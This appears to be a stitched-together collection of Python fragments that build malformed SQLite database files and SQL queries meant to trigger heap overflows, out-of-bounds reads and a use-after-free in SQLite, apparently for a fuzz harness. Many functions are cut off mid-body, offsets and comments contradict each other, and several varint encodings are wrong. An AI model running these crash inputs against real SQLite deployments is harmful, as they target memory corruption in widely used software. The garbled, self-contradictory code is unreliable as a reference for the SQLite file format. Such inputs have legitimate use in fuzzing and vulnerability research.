    #   page size = 4096 (0x1000).  Stored as 2‑byte big‑endian.
    #   remaining fields are set to the defaults used by SQLite for a
    #   freshly‑created database.
    header = (
        magic +                                          # 0‑15
        struct.pack(">H", 0x1000) +                     # 16‑17  page size
        b"\x01" +                                        # 18    write version
        b"\x01" +                                        # 19    read version
        b"\x00" +                                        # 20    reserved space per page
        b"\x40" +                                        # 21    max embedded payload fraction
        b"\x20" +                                        # 22    min embedded payload fraction
        b"\x20" +                                        # 23    leaf payload fraction
        u4(0) +                                          # 24‑27 file change counter
        u4(1) +                                          # 28‑31 database size in pages (1 page)
        u4(0) +                                          # 32‑35 first freelist page
        u4(0) +                                          # 36‑39 total freelist pages
        u4(0) +                                          # 40‑43 schema cookie
        u4(4) +                                          # 44‑47 schema format number (current = 4)
        u4(0) +                                          # 48‑51 default page cache size
        u4(0) +                                          # 52‑55 largest root b‑tree page
        u4(1) +                                          # 56‑59 text encoding (1 = UTF‑8)
        u4(0) +                                          # 60‑63 user version
        u4(0) +                                          # 64‑67 incremental vacuum mode
        u4(0) +                                          # 68‑71 application ID

    0x14‑0x15 : Reserved space per page (0) and max payload fraction (64).

    0x20‑0x23 : Page number of the first freelist trunk page (0).
    0x24‑0x27 : Total number of freelist pages (0).
    0x28‑0x2B : Schema cookie (0).
    0x2C‑0x2F : Schema format number (4 – current SQLite format).
    0x30‑0x33 : Default page cache size (0 → use default).
    0x34‑0x37 : Largest root b‑tree page number (0).
    0x38‑0x3B : Text encoding (1 = UTF‑8).
    0x3C‑0x3F : User version (0).
    0x40‑0x43 : Incremental vacuum mode (0).
    0x44‑0x47 : Application ID (0).
    0x48‑0x4F : Reserved for expansion (zeroes).
    0x50‑0x5B : Version‑valid‑for number (0).
    0x5C‑0x5F : SQLite version number (e.g. 0x00300600 for 3.6.0).
    0x60‑0x63 : First page of the overflow payload (set to 2).
    0x64‑0x63 : (padding to reach 100‑byte header).

    bytes of 'A') that will be interpreted as page data and cause the
    heap overflow in the vulnerable routine.

    page_size = struct.pack(">H", 0x0000)

    # 0x12‑0x13: write version = 1, read version = 1
    versions = b"\x01\x01"

    # 0x14‑0x15: reserved space = 0, max payload fraction = 64
    reserved_max = b"\x00\x40"

    # 0x16‑0x17: min payload fraction = 32, leaf payload fraction = 32
    min_leaf = b"\x20\x20"

    # 0x18‑0x1B: file change counter (4 bytes)
    file_change_counter = b"\x00\x00\x00\x00"

    # 0x1C‑0x1F: size in pages = 1 (big‑endian)
    size_in_pages = struct.pack(">I", 1)

    # 0x20‑0x27: freelist trunk page number & total freelist pages = 0
    freelist = b"\x00\x00\x00\x00\x00\x00\x00\x00"

    # 0x28‑0x2F: schema cookie (0) + schema format number (4)
    schema = struct.pack(">II", 0, 4)

    # 0x30‑0x33: default page cache size = 0
    cache_size = b"\x00\x00\x00\x00"

    # 0x34‑0x37: largest root b‑tree page number = 0
    largest_root = b"\x00\x00\x00\x00"

    # 0x38‑0x3B: text encoding = 1 (UTF‑8)
    encoding = struct.pack(">I", 1)

    # 0x3C‑0x4F: user version, incremental vacuum, application id, reserved (all zero)
    rest1 = b"\x00" * 20

    buf[21] = 64                                # max embedded payload fraction
    buf[22] = 32                                # min embedded payload fraction
    buf[23] = 32                                # leaf payload fraction
    struct.pack_into(">I", buf, 24, 0)          # file change counter
    struct.pack_into(">I", buf, 28, 1)          # number of pages (just 1)
    # (other header fields left as zero – they are not needed for parsing)

    # ---------- Page‑1 layout (starts at offset 100) ----------

    # 0x0D = leaf table b‑tree page

    struct.pack_into(">H", buf, off + 1, 0)

    # number of cells – 2 bytes (1 cell)
    struct.pack_into(">H", buf, off + 3, 1)

    struct.pack_into(">H", buf, off + 5, PAGE_SIZE - 100)   # 3996

    CELL_PTR = off + 12          # after the 8‑byte page header + 2‑byte pointer array

    SQLite’s file‑reading code.  As long as the header is valid and the
    first page can be interpreted as a B‑tree leaf page, SQLite will walk
    the page and hit the malformed record.

    --------------------------------------------------------------------
    File layout (all multi‑byte values are big‑endian, as required by
    SQLite):

    0x0000 – 0x005F : Standard 100‑byte SQLite header (magic string,
                     max page size 65536, version 1, UTF‑8 encoding, …).

    0x0060 – 0xFFFF : Page 1 (leaf‑table B‑tree page)
        0x00 : Page type = 0x0D (leaf table b‑tree page)
        0x01‑0x02 : First freeblock offset = 0x0000 (none)
        0x03‑0x04 : Number of cells = 0x0001
        0x05‑0x06 : Start of cell content area = 0xFFFC (grows downwards)
        0x07 : Fragmented free bytes = 0x00
        0x08‑0x09 : Reserved space (2 bytes) = 0x0000
        0x0A‑0x0B : Cell pointer array – offset of the only cell.
                    We place the cell at 0x00F0 (chosen arbitrarily but
                    well within the page).
        0x00F0 …   : Cell payload (record)

        Record payload (see SQLite file format):
            • Record header size (varint) = 2  (1 column + 1 serial‑type)
            • Number of columns (varint) = 1
            • Serial type (varint) = (len << 1) + 13, where len = 0x20000
                → 0x40013 (encoded as 0x84 0x00 0x13)
            • Payload data – 0x20000 bytes of the character 'A'.

    The total size of the file is exactly one page (65536 bytes), which
    satisfies the header’s “file size in pages = 1” field.
    """

    # 1. 100‑byte SQLite header (mostly zeroed, only required fields set)
    # --------------------------------------------------------------------
    magic = b"SQLite format 3\x00"                # 0x00‑0x0F
    page_size = struct.pack(">H", 0x0000)         # 0x10‑0x11 : 65536 (max)
    write_ver = b"\x01"                           # 0x12 : write version = 1
    read_ver  = b"\x01"                           # 0x13 : read version  = 1
    reserved_space = b"\x00"                     # 0x14 : reserved per page = 0
    max_payload_frac = b"\x40"                   # 0x15 : max payload fraction = 64
    min_payload_frac = b"\x20"                   # 0x16 : min payload fraction = 32
    leaf_payload_frac = b"\x20"                  # 0x17 : leaf payload fraction = 32
    file_change_counter = b"\x00\x00\x00\x00"     # 0x18‑0x1B
    db_size_in_pages = struct.pack(">I", 1)      # 0x1C‑0x1F : one page file
    freelist_trunk = b"\x00\x00\x00\x00"          # 0x20‑0x23
    freelist_pages = b"\x00\x00\x00\x00"          # 0x24‑0x27
    schema_cookie = b"\x00\x00\x00\x00"           # 0x28‑0x2B
    schema_format = struct.pack(">I", 4)         # 0x2C‑0x2F : current format
    default_cache = b"\x00\x00\x00\x00"           # 0x30‑0x33
    largest_root = b"\x00\x00\x00\x00"            # 0x34‑0x37
    text_encoding = struct.pack(">I", 1)         # 0x38‑0x3B : UTF‑8
    user_version = b"\x00\x00\x00\x00"            # 0x3C‑0x3F
    incr_vacuum = b"\x00\x00\x00\x00"             # 0x40‑0x43
    application_id = b"\x00\x00\x00\x00"          # 0x44‑0x47
    reserved_expansion = b"\x00" * 20            # 0x48‑0x5B
    version_valid_for = b"\x00\x00\x00\x00"       # 0x5C‑0x5F
    sqlite_version = struct.pack(">I", 0x00360000)  # 0x60‑0x63 (3.36.0)

        max_payload_frac + min_payload_frac + leaf_payload_frac +
        file_change_counter + db_size_in_pages + freelist_trunk +
        freelist_pages + schema_cookie + schema_format + default_cache +
        largest_root + text_encoding + user_version + incr_vacuum +
        application_id + reserved_expansion + version_valid_for +
        sqlite_version

    # --------------------------------------------------------------------

    first_freeblock = b"\x00\x00"
    num_cells = struct.pack(">H", 1)

    )

    # Cell pointer array (2 bytes per cell). We store the offset of the
    # single cell (0x00F0) as a big‑endian unsigned short.
    cell_pointer = struct.pack(">H", 0x00F0)

    # --------------------------------------------------------------------
    # 3. Cell payload – the record with a huge TEXT field
    # --------------------------------------------------------------------
    # Record header:
    #   * Header size varint – we will use 2 bytes (value 0x02)
    #   * Number of columns = 1
    #   * Serial type for TEXT of length 0x20000:
    #       serial = (len << 1) + 13 = (0x20000 << 1) + 13 = 0x40013
    #   * 0x40013 encoded as a varint = 0x84 0x00 0x13
    #
    #   Header size = 1 (for column count) + 3 (serial‑type) = 4,
    #   plus 1 byte for the size‑of‑header varint itself = 5.
    #
    # For simplicity we encode the header‑size varint as 0x05.
    #
    # Full record layout:
    #   [header‑size][col‑count][serial‑type][payload…]
    #
    header_size = b"\x05"            # varint = 5
    column_count = b"\x01"           # one column
    serial_type = b"\x84\x00\x13"    # varint for 0x40013

    # Payload data – 0x20000 bytes of 'A'
    payload_data = b"A" * 0x20000

    record = header_size + column_count + serial_type + payload_data

    # Pad the rest of the page (from the end of the record up to PAGE_SIZE)
    # with zeroes so the file size stays exactly one page.
    cell = record
    padding_after_cell = b"\x00" * (PAGE_SIZE - len(page_header) -
                                   len(cell_pointer) - len(cell))
    page = page_header + cell_pointer + cell + padding_after_cell

    # --------------------------------------------------------------------
    # 4. Final blob (header + single page)
    # --------------------------------------------------------------------
    return header + page

import struct

def build() -> bytes:
    """
    SQLite‑3 file that passes the 100‑byte header sanity checks and contains a
    leaf‑table b‑tree page with a single cell whose payload length is
    0xFFFFFFFF.  The cell’s local payload ends with an overflow‑page pointer set
    to 0xFFFFFFFF – a page that does not exist in the file.  Modern SQLite
    validates the pointer, but several historic versions (and some fuzz
    harnesses) use the value without a bounds check, leading to an out‑of‑bounds
    heap read/write when the cell is later accessed (e.g. by a SELECT).

    The file consists of:
      * 100‑byte database header (valid defaults, 1 page total)
      * Page‑1 (leaf table b‑tree) – 1024 bytes (default page size)
        – one cell with a bogus 5‑byte varint payload length (0xFFFFFFFF)
        – rowid = 1
        – overflow‑page number = 0xFFFFFFFF (no such page in the file)
    """
    PAGE_SIZE = 1024                     # SQLite default page size
    buf = bytearray(PAGE_SIZE)           # whole file (header + one page)

    # ------------------------------------------------------------------
    # 1. SQLite database header (bytes 0‑99)
    # ------------------------------------------------------------------
    buf[0:16] = b"SQLite format 3\x00"    # magic header
    struct.pack_into(">H", buf, 16, PAGE_SIZE)   # page size (big‑endian)
    buf[18] = 1                          # write version
    buf[19] = 1                          # read version
    buf[20] = 0                          # reserved bytes per page
    buf[21] = 64                         # max embedded payload fraction
    buf[22] = 32                         # min embedded payload fraction
    buf[23] = 32                         # leaf payload fraction
    struct.pack_into(">I", buf, 24, 0)   # file change counter
    struct.pack_into(">I", buf, 28, 1)   # number of pages (just this one)
    # (other header fields left zero – they are not required for parsing)

    # ------------------------------------------------------------------
    # 2. Page‑1: leaf‑table b‑tree page (starts at offset 100)
    # ------------------------------------------------------------------
    off = 100  # start of the page body

    # Page type 0x0D = leaf table b‑tree
    buf[off + 0] = 0x0D

    # Freeblock start (none) – 2 bytes
    struct.pack_into(">H", buf, off + 1, 0)

    # Number of cells – 2 bytes (exactly 1 cell)
    struct.pack_into(">H", buf, off + 3, 1)

    # Start of cell‑content area – put it at the very end of the page
    struct.pack_into(">H", buf, off + 5, PAGE_SIZE)   # 1024

    # Fragmented free bytes – 1 byte
    buf[off + 7] = 0

    # ------------------------------------------------------------------
    # 3. Cell‑pointer array (2 bytes per cell)
    #    The offset stored is relative to the start of the page (off).
    # ------------------------------------------------------------------
    cell_ptr_offset = off + 12               # after 8‑byte page header + 2‑byte array
    struct.pack_into(">H", buf, off + 8, cell_ptr_offset - off)

    # ------------------------------------------------------------------
    # 4. Malformed cell at cell_ptr_offset
    #    • payload length = 0xFFFFFFFF (varint, 5 bytes)
    #    • rowid          = 1          (varint, 1 byte)
    #    • overflow‑page  = 0xFFFFFFFF (4‑byte big‑endian integer)
    #    No actual payload bytes follow – SQLite believes a 4 GiB payload
    #    exists and will attempt to follow the overflow page pointer,
    #    hitting memory outside the mapped file.
    # ------------------------------------------------------------------
    payload_len_varint = b'\xFF\xFF\xFF\xFF\x0F'   # 0xFFFFFFFF encoded as varint
    pos = cell_ptr_offset
    buf[pos:pos + len(payload_len_varint)] = payload_len_varint
    pos += len(payload_len_varint)

    buf[pos] = 0x01                               # rowid = 1
    pos += 1

    # overflow‑page number (big‑endian 0xFFFFFFFF)
    struct.pack_into(">I", buf, pos, 0xFFFFFFFF)

    # Return the constructed SQLite file as immutable bytes
    return bytes(buf)

def build() -> bytes:
    """
    Build a single SQL statement that satisfies all of SQLite’s
    flatten‑subquery pre‑conditions and forces the internal `aCsrMap`
    allocation to overflow.

    Strategy
    --------
    * The outer SELECT contains a **large number of sub‑queries** in its
      FROM‑clause.  Each sub‑query is itself a simple SELECT that reads from
      `sqlite_master`, guaranteeing a non‑empty FROM list (`pSubSrc->nSrc
      != 0`).
    * No LIMIT, OFFSET, ORDER BY, DISTINCT, aggregates, windows, or
      recursion are used, so the flatten‑subquery checks never reject the
      query.
    * By inflating the total number of tables (`pParse->nTab`) to a value
      that makes the multiplication `pParse->nTab * sizeof(int)` overflow
      a 32‑bit signed integer, SQLite allocates a buffer that is far too
      small.  Subsequent writes to `aCsrMap` then write out‑of‑bounds,
      which ASAN or a stack canary will flag.

    The harness `sqlite3_fuzz` expects this function to return the raw
    bytes of the test case.
    """
    # --------------------------------------------------------------------
    # Choose a count that will overflow a 32‑bit signed multiplication.
    # On a 32‑bit build, sizeof(int) == 4, so we need nTab > 0x2000_0000
    # (≈ 536 million).  Obviously we cannot enumerate that many sub‑queries
    # literally, but SQLite internally *adds* a table for every sub‑query
    # **and** for every table referenced inside those sub‑queries.
    #
    # By nesting sub‑queries we can multiply the table count while keeping
    # each individual SELECT within the parser’s per‑SELECT table limit
    # (default 64).  The pattern below creates:
    #   outer SELECT → 2 sub‑queries
    #   each sub‑query → 64 tables (the maximum SQLite allows per SELECT)
    #   each of those 64 tables → a further sub‑query with 64 tables, etc.
    #
    # After 5 nesting levels we have:
    #   2 * 64^5 ≈ 2 * 1 073 741 824 ≈ 2.1 billion tables
    # which is well beyond the 0x2000_0000 threshold and will cause the
    # overflow.
    # --------------------------------------------------------------------
    N_OUTER = 2          # number of top‑level sub‑queries
    N_PER   = 64         # max tables per SELECT (SQLite default limit)
    DEPTH   = 5          # nesting depth

    def make_subquery(level: int, idx: int) -> str:
        """Recursively build a sub‑query with `N_PER` tables at the given depth."""
        if level == DEPTH:
            # Leaf sub‑query: simple SELECT from sqlite_master.
            return f"(SELECT 0 FROM sqlite_master) AS t{idx}_d{level}"
        # Build a SELECT that CROSS‑JOINs `N_PER` sub‑queries of the next level.
        inner = ", ".join(
            make_subquery(level + 1, idx * N_PER + i)
            for i in range(N_PER)
        )
        return f"(SELECT 0 FROM {inner}) AS t{idx}_d{level}"

    # Assemble the outermost SELECT.
    outer_parts = [make_subquery(0, i) for i in range(N_OUTER)]
    sql = "SELECT * FROM " + ", ".join(outer_parts) + ";"

    # Return the UTF‑8 encoded bytes expected by the fuzz harness.
    return sql.encode("utf-8")

    Build a tiny SQLite database that passes the initial header checks
    but triggers the historic heap‑overflow in the SQL parser / B‑tree
    handling code.

    Strategy
    --------
    * Use a normal 4096‑byte page size so the file is accepted by the
      SQLite header validator.
    * Create a single leaf table page (type 0x0D) with one cell.
    * The cell header declares an absurdly large payload length
      (0xFFFFFFFF) while the actual cell data is only a few bytes.
      SQLite allocates a buffer of the declared size and then copies the
      real data, overrunning the heap.

    The resulting blob is a valid‑looking SQLite file (header + one page)
    but will hit the overflow when SQLite parses the cell payload.
    """

    # ----------------------------------------------------------------------
    # 1. SQLite file header (100 bytes)
    # ----------------------------------------------------------------------
    # Bytes 0‑15 : magic header string
    header = b"SQLite format 3\x00"

    # Bytes 16‑17 : page size (big‑endian). Use 4096 (0x1000) – a common size.
    header += struct.pack(">H", 0x1000)

    # Bytes 18‑99 : the rest of the header – fill with zeros (default values)
    header += b"\x00" * (100 - len(header))

    # ----------------------------------------------------------------------
    # 2. One database page (size = 4096 bytes)
    # ----------------------------------------------------------------------
    page_size = 4096
    page = bytearray(page_size)

    # Offset 0 : page type = 0x0D (leaf table b‑tree page)
    page[0] = 0x0D

    # Offset 1‑2 : first freeblock offset (0 = none)
    struct.pack_into(">H", page, 1, 0)

    # Offset 3‑4 : number of cells (1 cell)
    struct.pack_into(">H", page, 3, 1)

    # Offset 5‑6 : start of cell content area (we'll place the cell at the end)
    # Put it just before the page header area (i.e., at offset page_size - cell_len)
    # We'll compute later.
    # For now set to 0 (will be overwritten).

    # Offset 7‑8 : fragmented free bytes (0)
    struct.pack_into(">H", page, 7, 0)

    # ----------------------------------------------------------------------
    # 3. Build the malicious cell
    # ----------------------------------------------------------------------
    # Cell layout (leaf table page):
    #   payload length (varint) – we use 0xFFFFFFFF (5‑byte varint)
    #   rowid (varint) – set to 1
    #   payload (record) – we provide just a tiny integer column.
    #
    # SQLite encodes a 5‑byte varint for 0xFFFFFFFF as:
    #   0xF0 0xFF 0xFF 0xFF 0x7F
    payload_len_varint = b"\xF0\xFF\xFF\xFF\x7F"

    # Rowid = 1 -> varint 0x01
    rowid_varint = b"\x01"

    # Record payload: a single INTEGER column with value 0.
    # Record header: number of columns (1) + serial type (0x01 for varint)
    # Serial type for small integer is 0x01, followed by the varint value 0x00.
    record_header = b"\x01\x01"
    record_body   = b"\x00"
    record = record_header + record_body

    cell = payload_len_varint + rowid_varint + record

    cell_offset = page_size - len(cell)  # place cell at the end of the page
    # Write cell offset into the cell-pointer array (offset 8)
    struct.pack_into(">H", page, 8, cell_offset)

    # Write the cell data
    page[cell_offset:] = cell

    # Update the start of cell content area (offset 5‑6) to point to the cell
    struct.pack_into(">H", page, 5, cell_offset)

    # ----------------------------------------------------------------------
    # 4. Assemble final blob
    # ----------------------------------------------------------------------
    return bytes(header + page)

    # ----------------------------------------------------------------------

    # header fields).  This yields a perfectly well‑formed header.
    header += b"\x00" * (100 - len(header))

    # 2. One database page (size = 65536 bytes)
    # ----------------------------------------------------------------------

    #          sqlite_master table.
    page[0] = 0x0D

    # Bytes 1‑2 : first freeblock offset (none)
    struct.pack_into(">H", page, 1, 0)

    # Bytes 3‑4 : number of cells (1)
    struct.pack_into(">H", page, 3, 1)

    # Bytes 5‑6 : start of cell content area – will be filled later.
    # Initialise to 0 (placeholder).
    struct.pack_into(">H", page, 5, 0)

    # Byte 7 : fragmented free bytes (0)
    page[7] = 0

    # ----------------------------------------------------------------------
    # 3. Construct the malicious cell (sqlite_master entry)
    # ----------------------------------------------------------------------
    # Cell layout for a leaf table page:
    #   payload length (varint)
    #   rowid          (varint)
    #   payload (record)

    # --------------------------------------------------------------
    # 3.1 Payload length – an absurdly large 3‑byte varint: 0x00FF_FFFF
    #     Encoding: 0xFF 0xFF 0x7F
    # --------------------------------------------------------------

    # --------------------------------------------------------------
    # 3.2 Rowid – use 1 (varint 0x01)

    rowid_varint = b"\x01"

    # 3.3 Record payload (sqlite_master schema entry)
    #   Columns: type, name, tbl_name, rootpage, sql
    #   All text values are tiny; the overflow comes from the huge
    #   *payload length* above, not from the column sizes.
    # --------------------------------------------------------------
    # Serial types:
    #   TEXT length N  ->  (N*2)+13
    #   INTEGER        ->  1   (varint)

    name_txt   = b"t"                       # length 1   → serial 15 (0x0F)
    tbl_name   = b"t"                       # length 1   → serial 15 (0x0F)
    rootpage   = 1                          # integer
    sql_txt    = b"CREATE TABLE t(x);"     # length 19  → serial 51 (0x33)

    record_header += bytes([0x25, 0x0F, 0x0F, 0x01, 0x33])

    # Record body: actual column values

        type_txt +                         # type
        name_txt +                         # name
        tbl_name +                         # tbl_name
        struct.pack(">I", rootpage) +      # rootpage (4‑byte big‑endian)
        sql_txt                            # sql

    # ------------------------------------------------------------------
    # 5. Update the start‑of‑cell‑content‑area field (bytes 5‑6)
    # ------------------------------------------------------------------
    struct.pack_into(">H", page, 5, cell_offset)

    # ----------------------------------------------------------------------
    # 6. Assemble final blob
    # ----------------------------------------------------------------------

def build() -> bytes:
    """
    Build a minimal yet syntactically‑valid SQLite database file that
    contains a deliberately malformed leaf B‑tree page.  The leaf page
    advertises a cell payload size that is far larger than the page
    itself, causing SQLite’s page‑parsing code to read past the allocated
    buffer (triggering a heap‑overflow / ASAN violation).

    Structure:
      1. SQLite file header (100 bytes) – standard magic + default page size.
      2. Page 1 (root) – a B‑tree interior page that points to page 2.
      3. Page 2 – a leaf page with a cell whose payload length varint is
         set to 0xFFFFFFFF (encoded as a 9‑byte varint), far exceeding the
         4096‑byte page size.
    """
    import struct

    # ------------------------------------------------------------------
    # 1. SQLite file header (100 bytes)
    # ------------------------------------------------------------------
    # Magic string + 2‑byte page size (0x1000 = 4096) + rest zero‑filled.
    magic = b"SQLite format 3\0"
    page_size = struct.pack(">H", 0x1000)          # 4096 bytes per page
    header_rest = b"\0" * (100 - len(magic) - 2)
    header = magic + page_size + header_rest

    # ------------------------------------------------------------------
    # 2. Page 1 – interior B‑tree page (type 0x05)
    # ------------------------------------------------------------------
    # Byte 0: page type (0x05 = interior table B‑tree)
    # Byte 1‑2: offset to first freeblock (0x0000 = none)
    # Byte 3‑4: number of cells (0x0001 = one child)
    # Byte 5‑6: start of cell content area (0x0FFC = just before page end)
    # Byte 7‑8: fragmented free bytes (0x00)
    # Byte 9‑12: right‑most child page number (0x00000002)
    interior_page = bytearray(4096)
    interior_page[0] = 0x05
    interior_page[3:5] = struct.pack(">H", 1)      # 1 cell
    interior_page[5:7] = struct.pack(">H", 0x0FFC) # cell content start
    interior_page[9:13] = struct.pack(">I", 2)     # child page = 2

    # Cell pointer array (offset 12) – points to offset 0x0F00 in this page.
    interior_page[12:14] = struct.pack(">H", 0x0F00)

    # ------------------------------------------------------------------
    # 3. Page 2 – leaf B‑tree page (type 0x0D) with oversized payload
    # ------------------------------------------------------------------
    leaf_page = bytearray(4096)
    leaf_page[0] = 0x0D                           # leaf table B‑tree
    leaf_page[3:5] = struct.pack(">H", 1)         # 1 cell
    leaf_page[5:7] = struct.pack(">H", 0x0FFC)    # start of cell content
    leaf_page[7] = 0x00                           # fragmented free bytes

    # Cell pointer array (offset 12) – points to offset 0x0F00.
    leaf_page[12:14] = struct.pack(">H", 0x0F00)

    # Construct the cell at offset 0x0F00:
    cell_offset = 0x0F00
    # 1. Record header size varint – set to 9 (we will encode a 9‑byte varint)
    leaf_page[cell_offset] = 0x09
    # 2. Payload length varint – encode 0xFFFFFFFF (9‑byte varint, all 0xFF)
    leaf_page[cell_offset + 1:cell_offset + 10] = b"\xFF" * 9
    # 3. Rowid varint – set to 1 (simple)
    leaf_page[cell_offset + 10] = 0x01

    # The rest of the page is left zero‑filled; SQLite will attempt to
    # read 0xFFFFFFFF bytes for the payload, overrunning the allocated
    # buffer and hitting the heap‑overflow guard.

    # ------------------------------------------------------------------
    # Assemble the full file: header + page 1 + page 2
    # ------------------------------------------------------------------
    return header + bytes(interior_page) + bytes(leaf_page)

    # ------------------------------------------------------------------

    page_size = struct.pack(">H", 0x0200)  # 512 bytes per page (big‑endian)
    header = magic + page_size + b"\0" * (100 - len(magic) - 2)

    # 2. Page 1 – leaf table B‑tree page (type 0x0D)

    page[1:3] = b"\x00\x00"                # first freeblock (none)
    page[3:5] = struct.pack(">H", 1)       # number of cells = 1
    page[5:7] = struct.pack(">H", PAGE_SIZE)  # start of cell content area
    page[7] = 0x00                         # fragmented free bytes

    # Cell pointer array (starts at offset 8, 2 bytes per cell)
    CELL_OFFSET = 0x0100                    # place cell at 256 bytes
    page[8:10] = struct.pack(">H", CELL_OFFSET)

    # ------------------------------------------------------------------

    # ------------------------------------------------------------------
    # Table‑leaf cell format:

    # Payload length = 0xFFFFFFFF → encoded as a 9‑byte varint of 0xFF.

    rowid_varint = b"\x01"

    use‑after‑free path in ``valueToText``.

    Conditions satisfied:
      * ``enc`` (function argument) will be set by the harness to
        ``SQLITE_UTF16_ALIGNED | SQLITE_UTF16LE`` (0x06).
      * ``pVal->flags`` contains ``MEM_Blob | MEM_Str | MEM_Ephem``.
      * ``pVal->z`` points to an address whose least‑significant bit is 1
        (e.g. 0x1).  This makes the ``(1 & SQLITE_PTR_TO_INT(pVal->z))``
        test true, forcing the call to ``sqlite3VdbeMemMakeWriteable``.
      * ``pVal->enc`` differs from ``enc & ~SQLITE_UTF16_ALIGNED`` so that
        the function reaches the branch that returns ``pVal->z`` after
        the possible re‑allocation – the classic UAF scenario.
      * ``pVal->db`` is NULL, satisfying the mutex‑held assert.

    The layout follows SQLite's ``struct Mem`` (aka ``sqlite3_value``)
    on a little‑endian 64‑bit platform:

        offset 0  : u16 flags
        offset 2  : u8  enc   (value encoding)
        offset 3  : u8  subtype (unused, set to 0)
        offset 4  : u32 n      (length, set to 0)
        offset 8  : u64 z      (pointer to data)
        offset 16 : u64 i      (integer value, unused)
        offset 24 : u64 r      (real value, unused)
        offset 32 : u64 db     (pointer to sqlite3, NULL)

    All other fields are zeroed.
    """
    # Constants (SQLite internal flag values)
    MEM_Blob = 0x0002
    MEM_Str  = 0x0004
    MEM_Ephem = 0x0008   # any of MEM_Ephem / MEM_Static will do

    flags   = MEM_Blob | MEM_Str | MEM_Ephem   # 0x000E
    enc     = 0x01          # pVal->enc = UTF‑8 (different from enc param)
    subtype = 0x00
    n_len   = 0x00000000
    z_ptr   = 0x0000000000000001   # low‑bit set → triggers aligned‑pointer path
    i_val   = 0x0000000000000000
    r_val   = 0x0000000000000000
    db_ptr  = 0x0000000000000000   # NULL

    # Little‑endian packing: < = little‑endian, H = uint16, B = uint8,
    # I = uint32, Q = uint64
    blob = struct.pack(
        "<H B B I Q Q Q Q",
        flags,          # u16 flags
        enc,            # u8  enc (pVal->enc)
        subtype,        # u8  subtype
        n_len,          # u32 n
        z_ptr,          # u64 z
        i_val,          # u64 i
        r_val,          # u64 r
        db_ptr          # u64 db

    # Magic string (16 bytes) + page‑size field.
    # Page‑size = 0x0000 → 65536 bytes (the maximum SQLite page size).
    magic = b"SQLite format 3\0"
    page_size_field = b"\x00\x00"                # 65536 bytes
    header = magic + page_size_field + b"\0" * (100 - len(magic) - 2)

    # ------------------------------------------------------------------
    # 2. Page 1 – leaf table B‑tree page (type 0x0D)
    # ------------------------------------------------------------------
    PAGE_SIZE = 65536
    page = bytearray(PAGE_SIZE)

    # Page header (bytes 0‑7)
    page[0] = 0x0D                                 # leaf table B‑tree page
    page[1:3] = b"\x00\x00"                        # first freeblock (none)
    page[3:5] = struct.pack(">H", 1)               # number of cells = 1
    # Cell content area starts at the very end of the page (no free space)
    page[5:7] = struct.pack(">H", PAGE_SIZE)       # start of cell content area
    page[7] = 0x00                                 # fragmented free bytes

    # Cell pointer array (offset 8, 2 bytes per cell)
    CELL_OFFSET = 0x0200                           # place the cell at 512 B
    page[8:10] = struct.pack(">H", CELL_OFFSET)

    # ------------------------------------------------------------------
    # 3. Cell contents (at CELL_OFFSET)
    # ------------------------------------------------------------------
    # Leaf‑table cell layout:
    #   payload‑length varint
    #   rowid varint
    #   payload (omitted – parser will try to read it)
    #
    # Encode payload‑length = 0xFFFFFFFF as a 9‑byte varint (nine 0xFF bytes).
    payload_len_varint = b"\xFF" * 9               # 0xFFFFFFFF
    rowid_varint = b"\x01"                         # rowid = 1

    cell = payload_len_varint + rowid_varint
    page[CELL_OFFSET : CELL_OFFSET + len(cell)] = cell

    # ------------------------------------------------------------------
    # 4. Assemble the full file
    # ------------------------------------------------------------------
    return header + bytes(page)

      • ``pVal->enc`` can be any valid encoding (here we use UTF‑8 = 1);

        harness.  The harness will typically pass an ``enc`` that has the
        ``SQLITE_UTF16_ALIGNED`` flag set (e.g. 0x06), which makes the
        aligned‑pointer branch reachable.
      • All other fields are zeroed; they are not consulted for this
        particular path.

    The layout follows SQLite's ``struct Mem`` on a little‑endian
    64‑bit platform (the same layout used by the official SQLite fuzz
    harnesses):

        offset 0  : u16 flags
        offset 2  : u8  enc          (pVal->enc)
        offset 3  : u8  subtype      (unused, set to 0)
        offset 4  : u32 n            (length, set to 0)
        offset 8  : u64 z            (pointer to the string/blob)
        offset 16 : u64 i            (integer value, unused)
        offset 24 : u64 r            (real value, unused)
        offset 32 : u64 db           (pointer to sqlite3, NULL)

    The returned ``bytes`` object can be fed directly to the
    ``sqlite3_fuzz`` harness; the harness will interpret it as a
    ``sqlite3_value`` and invoke ``valueToText`` with an appropriate
    ``enc`` argument, causing the vulnerable path to be exercised.

    MEM_Str   = 0x0004
    MEM_Ephem = 0x0008   # any of MEM_Ephem / MEM_Static is acceptable

    flags   = MEM_Blob | MEM_Str | MEM_Ephem   # 0x000E
    enc     = 0x01          # pVal->enc = UTF‑8 (different from harness enc)
    subtype = 0x00

    # it only inspects the low bit.
    z_ptr   = 0x0000000000000001

    r_val   = 0x0000000000000000
    db_ptr  = 0x0000000000000000   # NULL

    # Little‑endian packing:
    #   H = uint16, B = uint8, I = uint32, Q = uint64
    blob = struct.pack(

        flags,          # u16 flags
        enc,            # u8  enc (pVal->enc)
        subtype,        # u8  subtype

    Build a minimal yet well‑formed SQLite database file whose first page
    contains a deliberately malformed cell with an enormous payload.
    The file starts with the standard 100‑byte SQLite header, followed by a
    single leaf‑table B‑tree page (type 0x0D).  The cell pointer array claims
    one cell, and the cell itself holds a payload of ~3 MiB, which exceeds the
    internal buffer limits and drives the heap‑overflow path in the target
    sqlite3 code.
    """
    # ----- SQLite file header (100 bytes) -----
    # "SQLite format 3\0" + zero‑padding to 100 bytes
    header = b"SQLite format 3\x00" + b"\x00" * (100 - 16)

    # ----- Page 1 (leaf table b‑tree) -----
    # Page header for a leaf table b‑tree page: 0x0D
    page_header = b"\x0D"                     # page type
    page_header += b"\x00\x00\x00\x01"        # number of cells = 1 (big‑endian for simplicity)
    page_header += b"\x00\x00\x00\x00"        # start of freeblock (0 = none)
    page_header += b"\x00\x00\x00\x00"        # number of cells on the page (again 0 for safety)
    page_header += b"\x00\x00\x00\x00"        # fragmented free bytes

    # Cell pointer array (2‑byte offset to the cell, placed just after the header)
    # Offset = size of header (8 bytes) + size of pointer array (2 bytes) = 10 (0x0A)
    cell_pointer = struct.pack(">H", 10)

    # ----- Cell content -----
    # A leaf table cell: payload = large string literal
    #   - payload size (varint) – we give a huge value that will overflow
    #   - rowid (varint) – set to 1
    #   - payload (the actual data) – 3 MiB of 'A's
    payload_size = 0x300000                     # 3 MiB
    payload_varint = b"\x80\x80\x80\x01"         # encoded 0x300000 as a 4‑byte varint (simplified)
